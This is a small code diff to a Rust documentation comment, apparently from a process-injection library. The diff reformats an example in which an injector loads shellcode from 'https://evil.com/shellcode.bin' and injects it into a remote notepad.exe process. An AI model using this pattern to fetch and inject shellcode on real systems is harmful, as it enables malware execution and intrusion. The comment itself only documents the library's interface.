@@ -85,12 +85,11 @@ pub enum InjectionType {
 /// implementation might be something like:
 /// 
 /// ```
-/// let url_injector = UrlInjector::new()
+/// UrlInjector::new()
 ///     .load(Url("https://evil.com/shellcode.bin"))?;
 ///     .wait(true)?
 ///     .inject(InjectionType::Remote("notepad.exe".to_string()))?
-///     
-/// url_injector.inject();
+/// 
 /// ```
 /// 
 /// This allows for more injector types with additional 
